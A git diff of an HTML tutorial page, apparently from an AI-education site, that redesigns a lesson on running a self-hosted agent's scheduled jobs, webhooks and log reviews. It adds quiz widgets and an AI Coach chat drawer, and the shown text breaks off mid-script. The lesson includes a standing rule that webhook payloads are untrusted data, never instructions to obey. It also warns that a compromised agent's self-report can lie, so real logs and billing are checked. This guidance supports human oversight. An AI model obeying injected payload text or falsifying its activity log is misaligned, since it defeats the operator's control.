@@ -9,7 +9,7 @@
 <meta name="theme-color" content="#f0544f" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Instrument+Serif&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://learninggpt.ai/lessons/openclaw/automations-while-you-sleep" />
 <meta property="og:title" content="OpenClaw automations that run while you sleep" />
@@ -33,53 +33,119 @@ nav.top { position: sticky; top: 0; z-index: 100; backdrop-filter: blur(20px) sa
 .lesson { padding: 50px 0 100px; }
 .lesson-meta { display: flex; gap: 16px; flex-wrap: wrap; align-items: center; font-size: 13px; color: var(--text-mute); margin-bottom: 20px; }
 .lesson-meta .chip { padding: 4px 10px; border: 1px solid rgba(240,84,79,0.4); border-radius: 999px; font-size: 11px; color: var(--track); background: rgba(240,84,79,0.1); font-weight: 600; text-transform: uppercase; letter-spacing: 0.6px; }
-.lesson-meta .chip-pro { border-color: rgba(124,92,255,0.4); color: var(--brand); background: rgba(124,92,255,0.1); }
+.lesson-meta .chip-pro-plus { border-color: rgba(255,181,71,0.4); color: var(--warn); background: rgba(255,181,71,0.1); }
 .lesson-meta .dot { width: 4px; height: 4px; border-radius: 50%; background: var(--text-mute); }
 .lesson h1 { font-size: clamp(32px, 4.5vw, 46px); font-weight: 800; line-height: 1.15; letter-spacing: -0.02em; margin: 0 0 20px; }
-.lesson h1 .grad { background: linear-gradient(135deg, #f0544f 0%, #7c5cff 100%); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; }
+.lesson h1 .grad { background: linear-gradient(135deg, #f0544f 0%, #ff8a4d 45%, #7c5cff 100%); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; }
 .lesson h1 .serif { font-family: 'Instrument Serif', serif; font-style: italic; font-weight: 400; padding-right: 0.15em; }
-.lesson .deck { font-size: 19px; color: var(--text-dim); line-height: 1.55; margin: 0 0 36px; padding-bottom: 28px; border-bottom: 1px solid var(--line); }
-.lesson h2 { font-size: 28px; font-weight: 700; letter-spacing: -0.01em; margin: 56px 0 16px; }
-.lesson h2 .num { display: inline-block; color: var(--track); font-weight: 700; margin-right: 12px; font-size: 13px; letter-spacing: 1.5px; text-transform: uppercase; vertical-align: middle; }
-.lesson h3 { font-size: 19px; font-weight: 600; margin: 32px 0 10px; }
+.lesson .deck { font-size: 19px; color: var(--text-dim); line-height: 1.55; margin: 0 0 24px; padding-bottom: 28px; border-bottom: 1px solid var(--line); }
+.sec { margin: 46px 0 0; }
+.sec-eyebrow { display: inline-block; font-size: 11px; font-weight: 700; letter-spacing: 1.4px; text-transform: uppercase; color: var(--track); margin-bottom: 8px; }
+.lesson h2 { font-size: 27px; font-weight: 700; letter-spacing: -0.01em; margin: 4px 0 14px; }
 .lesson p { font-size: 16.5px; color: var(--text); margin: 0 0 18px; line-height: 1.7; }
 .lesson strong { font-weight: 700; color: var(--text); } .lesson em { font-style: italic; color: var(--text); }
-.lesson ol, .lesson ul { padding-left: 24px; margin: 0 0 18px; } .lesson li { margin-bottom: 8px; color: var(--text); }
-.callout { margin: 28px 0; padding: 22px 26px; background: linear-gradient(135deg, rgba(240,84,79,0.12), rgba(124,92,255,0.06)); border: 1px solid rgba(240,84,79,0.25); border-radius: var(--radius-lg); position: relative; }
-.callout::before { content: ''; position: absolute; top: 0; left: 0; bottom: 0; width: 3px; background: linear-gradient(180deg, #f0544f, #7c5cff); border-radius: 2px 0 0 2px; }
+.lesson code { background: rgba(240,84,79,0.14); color: #ff9b86; padding: 1px 6px; border-radius: 5px; font-size: 0.86em; font-family: 'SFMono-Regular', Consolas, monospace; }
+
+/* benches */
+.bench { margin: 22px 0; border: 1px solid var(--line-strong); border-radius: var(--radius-lg); overflow: hidden; background: #0d0d20; }
+.bench-bar { display: flex; align-items: center; justify-content: space-between; padding: 11px 16px; border-bottom: 1px solid var(--line); background: linear-gradient(90deg, rgba(240,84,79,0.08), rgba(124,92,255,0.05)); font-size: 12.5px; font-weight: 700; color: var(--text); }
+.bench-bar .ct { color: var(--track); }
+.brow { padding: 14px 16px; border-bottom: 1px solid var(--line); }
+.brow:last-of-type { border-bottom: none; }
+.brow-q { font-size: 13.5px; margin-bottom: 10px; } .brow-q b { color: var(--text); }
+.brow-btns { display: grid; gap: 8px; }
+.bbtn { text-align: left; font-size: 12.5px; font-weight: 600; font-family: inherit; padding: 10px 13px; border-radius: 9px; border: 1px solid var(--line-strong); background: rgba(255,255,255,0.03); color: var(--text); cursor: pointer; transition: all .15s; }
+.bbtn:hover:not(:disabled){ border-color: var(--track); }
+.bbtn:disabled { cursor: default; }
+.bbtn.right { background: rgba(68,224,164,0.16); border-color: var(--accent); color: #b6f4dc; }
+.bbtn.wrong { background: rgba(255,107,138,0.12); border-color: var(--danger); color: #ffb0c1; }
+.brow-fb { margin-top: 9px; font-size: 12.5px; color: var(--text-dim); display: none; padding: 9px 12px; border-radius: 8px; background: rgba(240,84,79,0.07); border-left: 2px solid var(--track); }
+.brow-fb.show { display: block; } .brow-fb b { color: var(--text); }
+
+/* ── LOG SKIM ── */
+.logwin { margin: 22px 0; border: 1px solid var(--line-strong); border-radius: var(--radius-lg); overflow: hidden; background: #07060e; }
+.log-bar { display: flex; align-items: center; justify-content: space-between; padding: 11px 15px; border-bottom: 1px solid var(--line); background: #15131f; }
+.log-bar .fn { font-family: 'SFMono-Regular', Consolas, monospace; font-size: 12px; color: var(--text-dim); }
+.log-bar .ct { font-size: 11.5px; font-weight: 700; color: var(--track); }
+.log-hint { padding: 9px 15px; font-size: 12px; color: var(--text-mute); border-bottom: 1px solid var(--line); }
+.log-body { padding: 6px 8px; font-family: 'SFMono-Regular', Consolas, monospace; font-size: 12px; }
+.logrow { display: flex; gap: 10px; align-items: center; padding: 7px 10px; border-radius: 6px; cursor: pointer; transition: background .12s; }
+.logrow:hover:not(.done) { background: rgba(255,255,255,0.04); }
+.logrow.done { cursor: default; }
+.logrow .lt { color: var(--text-mute); width: 78px; flex-shrink: 0; }
+.logrow .le { color: #c9c9e0; flex: 1; }
+.logrow .lv { font-size: 10.5px; font-weight: 700; opacity: 0; white-space: nowrap; }
+.logrow.ok { background: rgba(68,224,164,0.07); } .logrow.ok .le { color: #b6f4dc; } .logrow.ok .lv { color: var(--accent); opacity: 1; }
+.logrow.bad { background: rgba(255,107,138,0.12); } .logrow.bad .le { color: #ffb0c1; } .logrow.bad .lv { color: var(--danger); opacity: 1; }
+.log-done { padding: 13px 15px; font-size: 13px; border-top: 1px solid var(--line); background: rgba(255,107,138,0.08); color: var(--text-dim); display: none; }
+.log-done.show { display: block; animation: fadeIn .35s ease; } .log-done b { color: var(--text); }
+@keyframes fadeIn { from{opacity:0;transform:translateY(5px);} to{opacity:1;transform:none;} }
+
+.codeblock { background: rgba(0,0,0,0.3); border: 1px solid var(--line); border-radius: 10px; padding: 14px 16px; margin: 14px 0; font-family: 'SFMono-Regular', Consolas, monospace; font-size: 12px; color: var(--text-dim); line-height: 1.6; white-space: pre-wrap; }
+.codeblock .lbl { display: block; font-family: 'Inter', sans-serif; font-size: 10px; color: var(--text-mute); text-transform: uppercase; letter-spacing: 0.7px; margin-bottom: 7px; font-weight: 600; }
+
+.callout { margin: 22px 0; padding: 18px 22px; background: linear-gradient(135deg, rgba(240,84,79,0.12), rgba(124,92,255,0.05)); border: 1px solid rgba(240,84,79,0.25); border-radius: var(--radius-lg); }
+.callout.warn { background: linear-gradient(135deg, rgba(255,181,71,0.10), rgba(124,92,255,0.04)); border-color: rgba(255,181,71,0.28); }
 .callout .lbl { display: inline-block; font-size: 10.5px; font-weight: 700; letter-spacing: 1.2px; text-transform: uppercase; color: var(--track); margin-bottom: 8px; }
-.callout p:last-child { margin-bottom: 0; }
-.workflow { margin: 30px 0; background: linear-gradient(180deg, var(--surface) 0%, var(--bg-soft) 100%); border: 1px solid var(--line); border-radius: var(--radius-lg); padding: 28px; }
-.workflow-head { display: flex; align-items: center; gap: 12px; margin-bottom: 6px; }
-.workflow-num { width: 30px; height: 30px; border-radius: 8px; background: rgba(240,84,79,0.1); border: 1px solid rgba(240,84,79,0.25); display: grid; place-items: center; font-size: 12px; font-weight: 700; color: var(--track); }
-.workflow h3 { font-size: 20px; font-weight: 600; margin: 0; flex: 1; }
-.workflow p { font-size: 15px; margin: 0 0 14px; }
-.workflow h4 { font-size: 12px; text-transform: uppercase; letter-spacing: 1.2px; color: var(--text-mute); margin: 18px 0 8px; font-weight: 600; }
-.prompt-example { background: rgba(0,0,0,0.3); border: 1px solid var(--line); border-radius: 10px; padding: 14px 16px; margin: 8px 0 14px; font-family: 'SFMono-Regular', Consolas, monospace; font-size: 13.5px; color: var(--text); line-height: 1.6; white-space: pre-wrap; }
-.prompt-example .label { display: block; font-family: 'Inter', sans-serif; font-size: 10.5px; color: var(--text-mute); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; }
-.gotcha { background: rgba(255,181,71,0.06); border: 1px solid rgba(255,181,71,0.2); border-radius: 10px; padding: 14px 16px; margin: 14px 0; font-size: 14.5px; }
-.gotcha::before { content: '⚠ Gotcha: '; color: var(--warn); font-weight: 700; }
-.savings { display: inline-flex; align-items: center; gap: 8px; background: rgba(68,224,164,0.10); border: 1px solid rgba(68,224,164,0.3); padding: 8px 14px; border-radius: 8px; font-size: 13.5px; color: var(--text); margin-top: 6px; }
-.savings::before { content: '⏱'; font-size: 14px; } .savings strong { color: var(--accent); font-weight: 700; }
-.challenge { margin: 56px 0 40px; background: linear-gradient(135deg, rgba(240,84,79,0.12), rgba(124,92,255,0.1)); border: 1px solid rgba(240,84,79,0.25); border-radius: var(--radius-lg); padding: 36px; }
-.challenge h2 { margin-top: 0; }
-.challenge a.btn { display: inline-flex; align-items: center; gap: 8px; background: linear-gradient(135deg, #f0544f, #7c5cff); color: white; padding: 14px 26px; border-radius: 10px; font-weight: 600; font-size: 15px; box-shadow: 0 6px 24px rgba(124,92,255,0.3); transition: transform .15s; }
-.challenge a.btn:hover { transform: translateY(-1px); color: white; }
-.challenge a.btn.ghost { background: rgba(255,255,255,0.05); border: 1px solid var(--line-strong); box-shadow: none; }
-.challenge .btn-row { margin-top: 22px; display: flex; gap: 12px; flex-wrap: wrap; }
-.checklist { margin: 40px 0; padding: 28px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--surface); }
+.callout.warn .lbl { color: var(--warn); }
+.callout p { margin: 0; font-size: 14.5px; color: var(--text-dim); } .callout b { color: var(--text); }
+
+.challenge { margin: 46px 0 30px; background: linear-gradient(135deg, rgba(240,84,79,0.14), rgba(124,92,255,0.1)); border: 1px solid rgba(240,84,79,0.3); border-radius: var(--radius-lg); padding: 32px; }
+.challenge h2 { margin-top: 0; font-size: 24px; }
+.btn { display: inline-flex; align-items: center; gap: 8px; background: linear-gradient(135deg, #f0544f, #7c5cff); color: white; padding: 13px 24px; border-radius: 10px; font-weight: 600; font-size: 15px; border: none; cursor: pointer; font-family: inherit; box-shadow: 0 6px 24px rgba(240,84,79,0.3); transition: transform .15s; text-decoration: none; }
+.btn:hover { transform: translateY(-1px); color: white; }
+.btn.ghost { background: rgba(255,255,255,0.05); border: 1px solid var(--line-strong); box-shadow: none; color: var(--text-dim); }
+.btn.ghost:hover { color: var(--text); }
+.btn-row { margin-top: 22px; display: flex; gap: 12px; flex-wrap: wrap; }
+.checklist { margin: 30px 0; padding: 26px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--surface); }
 .checklist h3 { margin-top: 0; font-size: 18px; } .checklist ul { list-style: none; padding: 0; margin: 0; }
 .checklist li { padding: 10px 0 10px 32px; position: relative; font-size: 15px; color: var(--text); border-top: 1px solid var(--line); }
 .checklist li:first-child { border-top: none; padding-top: 0; }
 .checklist li::before { content: ''; position: absolute; left: 0; top: 14px; width: 20px; height: 20px; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2344e0a4' stroke-width='3'%3E%3Cpath d='M5 12l5 5L20 7'/%3E%3C/svg%3E"); background-size: contain; background-repeat: no-repeat; }
 .checklist li:first-child::before { top: 4px; }
-.next-up { margin: 60px 0 0; padding: 32px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--bg-soft); }
+.next-up { margin: 40px 0 0; padding: 30px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--bg-soft); }
 .next-up .lbl { font-size: 11px; letter-spacing: 1.2px; text-transform: uppercase; color: var(--text-mute); font-weight: 600; margin-bottom: 10px; }
 .next-up h3 { margin: 0 0 8px; font-size: 20px; } .next-up p { margin: 0 0 14px; color: var(--text-dim); font-size: 14.5px; }
-.next-up .pro-tag { display: inline-block; font-size: 11px; font-weight: 700; letter-spacing: 0.6px; background: rgba(124,92,255,0.18); color: var(--brand); padding: 3px 10px; border-radius: 999px; border: 1px solid rgba(124,92,255,0.35); }
-footer { border-top: 1px solid var(--line); padding: 30px 0; }
+.next-up .pro-plus-tag { display: inline-block; font-size: 11px; font-weight: 700; letter-spacing: 0.6px; background: rgba(255,181,71,0.18); color: var(--warn); padding: 3px 10px; border-radius: 999px; border: 1px solid rgba(255,181,71,0.35); }
+footer { border-top: 1px solid var(--line); padding: 30px 0; margin-top: 40px; }
 .footer-inner { max-width: var(--container); margin: 0 auto; padding: 0 24px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: var(--text-mute); }
 @media (max-width: 600px) { .footer-inner { flex-direction: column; gap: 12px; text-align: center; } }
+
+/* ── AI COACH WIDGET ── */
+.coach-fab { position: fixed; bottom: 28px; right: 28px; z-index: 999; width: 52px; height: 52px; border-radius: 50%; background: linear-gradient(135deg, #44e0a4, #7c5cff); border: none; box-shadow: 0 8px 28px rgba(68,224,164,0.4); display: flex; align-items: center; justify-content: center; font-size: 22px; cursor: pointer; transition: transform .2s, box-shadow .2s; }
+.coach-fab:hover { transform: scale(1.08); box-shadow: 0 12px 36px rgba(68,224,164,0.5); }
+.coach-fab .coach-fab-badge { position: absolute; top: -4px; right: -4px; background: #7c5cff; color: white; font-size: 9px; font-weight: 700; padding: 2px 5px; border-radius: 999px; border: 2px solid #0a0a1a; line-height: 1.2; }
+.coach-drawer { position: fixed; bottom: 90px; right: 28px; z-index: 998; width: 360px; max-height: 520px; background: #13132a; border: 1px solid rgba(68,224,164,0.25); border-radius: 18px; box-shadow: 0 24px 60px rgba(0,0,0,0.5); display: flex; flex-direction: column; transform: scale(0.92) translateY(16px); opacity: 0; pointer-events: none; transition: transform .25s cubic-bezier(.34,1.56,.64,1), opacity .2s; }
+.coach-drawer.open { transform: scale(1) translateY(0); opacity: 1; pointer-events: all; }
+.coach-drawer-head { padding: 16px 18px 14px; border-bottom: 1px solid rgba(255,255,255,0.08); display: flex; align-items: center; gap: 10px; }
+.coach-avatar { width: 32px; height: 32px; border-radius: 10px; background: linear-gradient(135deg, #44e0a4, #7c5cff); display: grid; place-items: center; font-size: 16px; flex-shrink: 0; }
+.coach-head-info { flex: 1; }
+.coach-head-name { font-weight: 700; font-size: 14px; }
+.coach-head-sub { font-size: 11px; color: #44e0a4; }
+.coach-close { background: none; border: none; color: #6b6b85; font-size: 18px; padding: 4px; line-height: 1; cursor: pointer; }
+.coach-close:hover { color: #f5f5fa; }
+.coach-messages { flex: 1; overflow-y: auto; padding: 16px 18px; display: flex; flex-direction: column; gap: 12px; scroll-behavior: smooth; }
+.coach-messages::-webkit-scrollbar { width: 4px; }
+.coach-messages::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.14); border-radius: 4px; }
+.msg { max-width: 88%; font-size: 13.5px; line-height: 1.6; }
+.msg-coach { align-self: flex-start; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); border-radius: 14px 14px 14px 4px; padding: 10px 14px; color: #f5f5fa; }
+.msg-user { align-self: flex-end; background: linear-gradient(135deg, rgba(124,92,255,0.25), rgba(91,141,239,0.25)); border: 1px solid rgba(124,92,255,0.3); border-radius: 14px 14px 4px 14px; padding: 10px 14px; color: #f5f5fa; }
+.msg-thinking { align-self: flex-start; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 14px 14px 14px 4px; padding: 10px 14px; display: flex; align-items: center; gap: 6px; color: #6b6b85; font-size: 13px; }
+.thinking-dot { width: 6px; height: 6px; border-radius: 50%; background: #44e0a4; animation: coachPulse 1.2s ease-in-out infinite; }
+.thinking-dot:nth-child(2) { animation-delay: .2s; }
+.thinking-dot:nth-child(3) { animation-delay: .4s; }
+@keyframes coachPulse { 0%,100%{opacity:.3;transform:scale(.8)} 50%{opacity:1;transform:scale(1)} }
+.coach-limit { padding: 10px 18px; font-size: 11px; color: #6b6b85; text-align: center; border-top: 1px solid rgba(255,255,255,0.08); display: none; }
+.coach-limit.visible { display: block; }
+.coach-limit a { color: #5b8def; }
+.coach-input-row { padding: 12px 18px 16px; border-top: 1px solid rgba(255,255,255,0.08); display: flex; gap: 8px; align-items: flex-end; }
+.coach-input { flex: 1; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); color: #f5f5fa; border-radius: 10px; padding: 9px 12px; font-size: 13px; font-family: inherit; resize: none; max-height: 100px; line-height: 1.5; }
+.coach-input:focus { outline: none; border-color: #44e0a4; }
+.coach-input::placeholder { color: #6b6b85; }
+.coach-send { width: 34px; height: 34px; border-radius: 9px; border: none; flex-shrink: 0; background: linear-gradient(135deg, #44e0a4, #7c5cff); color: white; font-size: 15px; display: grid; place-items: center; cursor: pointer; transition: opacity .15s; }
+.coach-send:hover { opacity: 0.85; }
+.coach-send:disabled { opacity: 0.4; cursor: default; }
+@media (max-width: 480px) { .coach-drawer { width: calc(100vw - 32px); right: 16px; bottom: 80px; } .coach-fab { right: 16px; bottom: 16px; } }
 </style>
 </head>
 <body>
@@ -94,73 +160,75 @@ footer { border-top: 1px solid var(--line); padding: 30px 0; }
 <article class="lesson">
   <div class="container">
     <div class="lesson-meta">
-      <span class="chip">Lesson 9 · OpenClaw, Safely</span>
+      <span class="chip">Lesson 09 · OpenClaw, Safely</span>
       <span class="chip chip-pro-plus">Pro+</span>
-      <span>~10 min read</span>
+      <span>~10 min</span>
       <span class="dot"></span>
       <span>Cron · webhooks · logs</span>
     </div>
     <h1>Automations that run <span class="grad serif">while you sleep.</span></h1>
-    <p class="deck">The whole point of self-hosting an agent is that it works when you don't. This lesson scales you from a few starter workflows to a quiet machine of scheduled jobs and event triggers — paired with the habit that makes 24/7 autonomy trustworthy: always being able to answer "what did my agent do last night?"</p>
+    <p class="deck">The whole point of self-hosting an agent is that it works when you don't. This scales you from a few starter workflows to a quiet machine of scheduled jobs and event triggers — paired with the habit that makes 24/7 autonomy trustworthy: always being able to answer "what did my agent do last night?"</p>
 
-    <h2><span class="num">01</span> Cron: the heartbeat</h2>
-    <div class="workflow">
-      <div class="workflow-head"><div class="workflow-num">1</div><h3>Scheduled jobs, done like an operator</h3></div>
-      <p>You met cron in Lesson 6 (the morning briefing). OpenClaw's scheduler runs any task on any rhythm — the craft is in writing jobs that fail gracefully and stay observable. Four rules per job:</p>
-      <ul>
-        <li><strong>One job, one purpose.</strong> Five small jobs beat one mega-briefing — when something breaks, you know what and where.</li>
-        <li><strong>Every job reports failure.</strong> "If this task fails, message me 'JOB X FAILED: reason'" — silence should always mean success, never mystery.</li>
-        <li><strong>Stagger the schedule.</strong> 7:00, 7:10, 7:20 — not everything at 7:00. Easier on rate limits, and the logs read like a story instead of a pileup.</li>
-        <li><strong>Cap the work.</strong> "Check 5 sources max," "spend no more than ~2 minutes" — bounded jobs can't spiral into token bonfires while you sleep.</li>
-      </ul>
-      <h4>A well-shaped overnight job</h4>
-      <div class="prompt-example"><span class="label">Nightly digest job</span>Every night at 11pm:
+    <!-- cron shaper -->
+    <div class="sec">
+      <span class="sec-eyebrow">Do it · shape the cron job</span>
+      <h2>Scheduled jobs, done like an operator.</h2>
+      <p>OpenClaw's scheduler runs any task on any rhythm — the craft is jobs that fail gracefully and stay observable. For each rule, pick the operator's version.</p>
+      <div class="bench">
+        <div class="bench-bar"><span>Harden the nightly job</span><span class="ct" id="cronCt">0 / 4</span></div>
+        <div id="cronRows"></div>
+      </div>
+      <div class="codeblock"><span class="lbl">A well-shaped overnight job</span>Every night at 11pm:
 Collect what changed today across my watchers and the notes/inbox folder.
-Write a 10-line maximum summary to notes/daily/YYYY-MM-DD.md.
+Write a 10-line max summary to notes/daily/YYYY-MM-DD.md.
 Do NOT message me at night — file only. Mention it in the 7am briefing.
-If any step fails, include "⚠ issues last night" at the TOP of the 7am briefing.</div>
-      <div class="savings"><strong>Pattern:</strong> overnight work goes to files; mornings get one consolidated push. Your phone stays quiet, nothing is lost.</div>
+If any step fails, put "⚠ issues last night" at the TOP of the 7am briefing.</div>
+      <div class="callout">
+        <span class="lbl">The pattern</span>
+        <p>Overnight work goes to <b>files</b>; mornings get one consolidated push. Your phone stays quiet, nothing is lost — and silence always means success, never mystery.</p>
+      </div>
     </div>
 
-    <h2><span class="num">02</span> Webhooks: let events find your agent</h2>
-    <div class="workflow">
-      <div class="workflow-head"><div class="workflow-num">2</div><h3>From "check on a schedule" to "react when it happens"</h3></div>
-      <p>A webhook is an inbound doorbell: another service sends a small message to a URL your agent listens on, and a task fires. Form submitted → agent summarizes it. Repo pushed → agent reviews the changelog. Smart-home event → agent logs it. Where polling checks 24 times a day and misses the moment, webhooks fire at the moment.</p>
-      <h4>But an inbound door is an inbound door</h4>
-      <p>Webhooks are the one feature in this lesson that deliberately pokes a hole toward the outside world — so they inherit every rule from Lesson 3, plus three of their own:</p>
-      <ul>
-        <li><strong>Through the tunnel, not the open internet.</strong> Receive webhooks over your Tailscale network (services that support it), or via a relay you control. Exposing your gateway port to make a webhook work is exactly the mistake from the scan reports.</li>
-        <li><strong>Treat payloads as untrusted input.</strong> Anything arriving on a webhook is text from outside: data to summarize, never instructions to obey. Same doctrine as web pages (Lesson 8), same standing rule in your config.</li>
-        <li><strong>Secret in the URL, action that's boring.</strong> Use the long random webhook paths OpenClaw generates, and wire webhooks to low-stakes actions (notify, log, summarize) — not to anything in the dangerous trio.</li>
-      </ul>
+    <!-- webhook bench -->
+    <div class="sec">
+      <span class="sec-eyebrow">Do it · let events find your agent</span>
+      <h2>Webhooks are an inbound door.</h2>
+      <p>A webhook lets another service trigger a task the moment something happens — form submitted, repo pushed, sensor fired. But an inbound door inherits every Lesson-3 rule plus its own. Two calls:</p>
+      <div class="bench">
+        <div class="bench-bar"><span>Wire the webhook safely</span><span class="ct" id="whCt">0 / 2</span></div>
+        <div id="whRows"></div>
+      </div>
     </div>
 
-    <h2><span class="num">03</span> The 3am question: reading your agent's diary</h2>
-    <div class="workflow">
-      <div class="workflow-head"><div class="workflow-num">3</div><h3>If you can't answer "what did it do last night," you don't have automation — you have hope</h3></div>
-      <p>OpenClaw logs what the agent does: tasks run, pages fetched, files touched, messages sent. The operator habit is a <strong>weekly two-minute skim</strong> of those logs with three questions:</p>
-      <ul>
-        <li><strong>Did it do what I scheduled?</strong> Jobs present, on time, no silent skips.</li>
-        <li><strong>Did it do anything I didn't schedule?</strong> Unexplained fetches, file writes outside the workspace, messages you didn't expect — investigate immediately (and remember the skill-probation rule from Lesson 7).</li>
-        <li><strong>Is the spend curve flat?</strong> Cross-check the provider dashboard: cost per day should look like last week. A bend in that curve is your earliest warning light.</li>
-      </ul>
-      <h4>Make the agent help</h4>
-      <div class="prompt-example"><span class="label">Self-report job (meta, but it works)</span>Every Sunday at 5pm, review your own activity log for the week.
-Send me: total jobs run, failures, any action outside the workspace
-folder, any new domains contacted, and estimated API spend vs last week.
-Flag anything unusual FIRST. Honesty over tidiness.</div>
-      <div class="gotcha">A self-report is a convenience, not an alibi — a compromised agent's diary can lie. The weekly skim of the real logs (and the provider's billing page, which the agent can't edit) is what makes the self-report trustworthy. Defense in layers, as always.</div>
+    <!-- LOG SKIM -->
+    <div class="sec">
+      <span class="sec-eyebrow">Do it · the 3am question</span>
+      <h2>Read your agent's diary.</h2>
+      <p>If you can't answer "what did it do last night," you don't have automation — you have hope. Here's a week of your agent's activity log. Tap the entries that deserve a second look.</p>
+      <div class="logwin">
+        <div class="log-bar"><span class="fn">📑 agent-activity.log · last 7 days</span><span class="ct" id="logCt">0 / 3 flagged</span></div>
+        <div class="log-hint">Tap any line to check it against what you scheduled.</div>
+        <div class="log-body" id="logBody"></div>
+        <div class="log-done" id="logDone"></div>
+      </div>
+      <div class="callout warn">
+        <span class="lbl">The self-report isn't an alibi</span>
+        <p>You can have the agent email you a weekly self-report ("jobs run, failures, anything outside the workspace, new domains, spend vs last week — flag anything unusual first"). Handy — but <b>a compromised agent's diary can lie.</b> The weekly skim of the real logs and the provider's billing page (which the agent can't edit) is what makes the self-report trustworthy. Defense in layers.</p>
+      </div>
     </div>
 
-    <h2><span class="num">04</span> What a mature setup looks like</h2>
-    <p>Six months in, the well-run OpenClaw box is almost boring: a 7am briefing, four watchers, a nightly digest to files, one webhook from a form, a Sunday self-report — every job bounded, every failure loud, logs skimmed weekly over coffee. That boredom is the achievement. The demo-reel agents doing wild unsupervised tasks are the ones that end up in scan reports; the quiet ones compound value for years.</p>
+    <div class="sec">
+      <span class="sec-eyebrow">Where this lands</span>
+      <h2>A mature setup is almost boring.</h2>
+      <p>Six months in, the well-run box is quiet: a 7am briefing, four watchers, a nightly digest to files, one webhook from a form, a Sunday self-report — every job bounded, every failure loud, logs skimmed weekly over coffee. That boredom <em>is</em> the achievement. The demo-reel agents doing wild unsupervised tasks end up in scan reports; the quiet ones compound value for years.</p>
+    </div>
 
     <div class="challenge">
-      <h2 style="margin-top: 0;">Build your overnight layer</h2>
-      <p>Add the nightly digest job and the Sunday self-report this week. Then do your first real log skim and answer the three questions out loud. That ritual — five minutes a week — is the entire difference between owning an agent and merely hosting one.</p>
+      <h2>Build your overnight layer</h2>
+      <p>Add the nightly-digest job and the Sunday self-report this week. Then do your first real log skim and answer the three questions out loud — did it do what I scheduled, did it do anything I didn't, is the spend curve flat? That ritual, five minutes a week, is the entire difference between owning an agent and merely hosting one.</p>
       <div class="btn-row">
         <a href="/lessons/openclaw/lock-it-down" class="btn">Next: lock it down &amp; keep it current →</a>
-        <a href="/lessons/openclaw/" class="btn ghost">All OpenClaw lessons →</a>
+        <a href="/lessons/openclaw/" class="btn ghost">All OpenClaw lessons</a>
       </div>
     </div>
 
@@ -176,19 +244,230 @@ Flag anything unusual FIRST. Honesty over tidiness.</div>
     </div>
 
     <div class="next-up">
-      <span class="pro-tag">Pro</span>
+      <span class="pro-plus-tag">Pro+</span>
       <div class="lbl" style="margin-top: 14px;">Up next in OpenClaw, Safely</div>
       <h3>Lesson 10 · Lock it down and keep it current</h3>
-      <p>The maintenance contract: weekly updates, SecureClaw audits, backups, and the graceful teardown — plus the curriculum for staying current with a project that ships weekly. <a href="/#pricing">See pricing →</a></p>
+      <p>The maintenance contract: weekly updates, SecureClaw audits, backups, and the graceful teardown — plus staying current with a project that ships weekly. <a href="/lessons/openclaw/lock-it-down">Start lesson 10 →</a></p>
     </div>
   </div>
 </article>
 <footer>
   <div class="footer-inner">
-    <div>© 2026 LearningGPT, Inc. · Independent. Not affiliated with the OpenClaw project.</div>
+    <div>© 2026 LearningGPT · Independent. Not affiliated with the OpenClaw project.</div>
     <a href="/lessons/openclaw/" style="color: var(--text-dim);">← All OpenClaw lessons</a>
   </div>
 </footer>
+
+<!-- ── AI COACH FAB ── -->
+<button class="coach-fab" id="coachFab" title="Ask the AI Coach">
+  🎓
+  <span class="coach-fab-badge">AI</span>
+</button>
+<!-- ── AI COACH DRAWER ── -->
+<div class="coach-drawer" id="coachDrawer">
+  <div class="coach-drawer-head">
+    <div class="coach-avatar">🎓</div>
+    <div class="coach-head-info">
+      <div class="coach-head-name">AI Coach</div>
+      <div class="coach-head-sub">Ask anything about this lesson</div>
+    </div>
+    <button class="coach-close" id="coachClose">✕</button>
+  </div>
+  <div class="coach-messages" id="coachMessages">
+    <div class="msg msg-coach">Hey! I'm your AI Coach for this lesson. Ask me anything about overnight automations — cron jobs, webhooks, or reading your agent's logs. What's on your mind?</div>
+  </div>
+  <div class="coach-limit" id="coachLimit">
+    Free lesson coaching is limited to 3 questions. <a href="/pricing">Upgrade to Pro</a> for unlimited coaching on every lesson.
+  </div>
+  <div class="coach-input-row">
+    <textarea class="coach-input" id="coachInput" placeholder="Ask about this lesson…" rows="1"></textarea>
+    <button class="coach-send" id="coachSend">➤</button>
+  </div>
+</div>
+
+<script id="lessonScript">
+(function () {
+  // ── CRON SHAPER ──
+  var CRON = [
+    { rule: 'Scope', q: 'How do you split the overnight work?',
+      opts: [{ t: 'One job per purpose — five small jobs', ok: true }, { t: 'One mega-job that does everything', ok: false }],
+      why: 'Five small jobs beat one mega-briefing — when something breaks, you know exactly what and where.' },
+    { rule: 'Failure', q: 'What happens when a job fails?',
+      opts: [{ t: 'Message me "JOB X FAILED: reason"', ok: true }, { t: 'Skip silently and try again tomorrow', ok: false }],
+      why: 'Silence should always mean success, never mystery. Every job reports its own failures, loudly.' },
+    { rule: 'Timing', q: 'When do the morning jobs run?',
+      opts: [{ t: 'Stagger them: 7:00, 7:10, 7:20…', ok: true }, { t: 'Fire everything at 7:00 sharp', ok: false }],
+      why: 'Staggering is easier on rate limits, and the logs read like a story instead of a pileup.' },
+    { rule: 'Bounds', q: 'How much work can a job do?',
